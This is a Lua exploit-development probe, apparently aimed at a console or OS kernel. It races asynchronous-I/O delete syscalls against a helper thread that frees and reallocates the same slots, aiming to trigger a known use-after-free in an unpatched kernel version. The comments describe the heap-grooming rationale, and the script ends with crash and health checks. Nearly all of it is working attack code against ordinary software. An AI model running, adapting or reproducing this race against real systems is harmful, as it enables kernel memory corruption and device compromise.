-- CRASH_CLASS: HIGH
-- PROBE 502a: delete versus free+reallocate of the same aio slot
--
-- The published 14.20 fix describes the pre-fix path as: delete drops the lock,
-- a racing thread frees and REALLOCATES that slot, and 14.10 then frees
-- sub-objects of the attacker-swapped object. The earlier races here were
-- delete-versus-delete only, which can end in the status-only path
-- ([W+0x18] already cleared) without ever swapping the slot.
--
-- This probe runs the documented shape: one caller deletes the list, the helper
-- deletes the same list and immediately creates replacements into the freed
-- slots (count=1, so the descriptor array is a 0x28 user-controlled allocation,
-- the same small-size class as the 0x30 context the delete frees).
print("=== PROBE 502a: aio slot swap race ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(a) return string.format("0x%X", a) end
local N, ITER = 32, 40
local ids   = memory.alloc(0x40 * 8 + 0x100)
local data  = memory.alloc(0x200)
local out   = memory.alloc(0x80)
local res1  = memory.alloc(0x400)
local res2  = memory.alloc(0x400)
local gate  = memory.alloc(0x40)
local health = memory.alloc(0x40)
for o = 0, 0x3C, 4 do pcall(function() memory.write_dword(gate + o, 0) end) end
for o = 0, 0x3C, 4 do pcall(function() memory.write_dword(health + o, 0) end) end
for o = 0, 0x1FC, 4 do pcall(function() memory.write_dword(data + o, 0) end) end

local A = hx(to_num(ids)); local D = hx(to_num(data)); local O = hx(to_num(out))
local R1 = hx(to_num(res1)); local R2 = hx(to_num(res2))
local G = hx(to_num(gate)); local H = hx(to_num(health))

local body = ([[
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local c, p, d = make_syscall(669), make_syscall(664), make_syscall(662)
local IDS = %s; local DATA = %s; local OUT = %s; local RES = %s
local GATE = %s; local HEALTH = %s
local N = %d
local function rd(a) return to_num(memory.read_dword(a)) end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
while rd(GATE) == 0 do end
wr(GATE + 4, 1)
for it = 1, %d do
  pcall(function() d(IDS, N, RES) end)
  for i = 0, N - 1 do
    wr(OUT, 0)
    local ok = pcall(function() c(1, DATA, 1, 1, OUT) end)
    local id = rd(OUT)
    if id ~= 0 then wr(IDS + i * 4, id) end
  end
  pcall(function() p(IDS, N, RES + 0x100) end)
end
wr(GATE + 8, 1)
]]):format(A, D, O, R1, G, H, N, ITER)

local thr = run_lua_code_in_new_thread(body, { async = true })

-- create the initial set
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local made = 0
for i = 0, N - 1 do
  pcall(function() memory.write_dword(out, 0) end)
  local ok = pcall(function() return sc_c(1, uint64(D), 1, 1, uint64(O)) end)
  local id = to_num(memory.read_dword(out))
  if id ~= 0 then
    pcall(function() memory.write_dword(ids + i * 4, id) end)
    made = made + 1
  end
end
local rpoll = select(2, pcall(function() return sc_p(uint64(A), N, uint64(hx(to_num(res2)))) end))
print(string.format("created=%d poll=%s ids=%s", made, tostring(rpoll),
  table.concat({ tostring(to_num(memory.read_dword(ids))), tostring(to_num(memory.read_dword(ids + 4))) }, ",")))

-- open the gate and race the list delete against the helper's delete+create loop
pcall(function() memory.write_dword(gate, 1) end)
local okdel, retdel = pcall(function() return sc_d(uint64(A), N, uint64(R1)) end)
local s = {}
for i = 0, N - 1 do s[#s + 1] = string.format("%X", to_num(memory.read_dword(R1 + i * 4))) end
print(string.format("parent delete ret=%s statuses=%s", tostring(retdel), table.concat(s, ",")))

-- wait for the helper to finish its loop
local spins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and spins < 400000 do spins = spins + 1 end
print("helper done=" .. tostring(to_num(memory.read_dword(gate + 8))) .. " spins=" .. spins)

-- health: 8 fresh create/poll/delete cycles
local clean, bad = 0, 0
for i = 0, 7 do
  pcall(function() memory.write_dword(out, 0) end)
  local ok = pcall(function() return sc_c(1, uint64(D), 1, 1, uint64(O)) end)
  local id = to_num(memory.read_dword(out))
  if id ~= 0 then
    pcall(function() memory.write_dword(health, id) end)
    pcall(function() sc_p(uint64(hx(to_num(health))), 1, uint64(hx(to_num(res2)))) end)
    local okd, st = pcall(function() return sc_d(uint64(hx(to_num(health))), 1, uint64(R1)) end)
    local v = to_num(memory.read_dword(R1))
    if okd and v == 0 then clean = clean + 1 else bad = bad + 1 end
  else
    bad = bad + 1
  end
end
print(string.format("health: clean=%d bad=%d", clean, bad))
print("=== PROBE 502a COMPLETE ===")
